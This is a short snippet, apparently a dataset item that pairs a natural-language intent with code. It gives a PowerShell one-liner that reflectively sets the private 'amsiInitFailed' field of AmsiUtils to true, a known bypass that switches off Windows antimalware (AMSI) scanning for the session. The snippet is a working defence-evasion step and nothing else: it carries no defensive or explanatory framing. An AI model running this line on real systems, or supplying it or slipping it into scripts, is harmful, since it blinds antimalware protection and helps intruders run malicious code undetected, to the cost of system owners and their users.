# Natural language intent:
# Modifies an AMSI-related field to disable AMSI in PowerShell.

[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
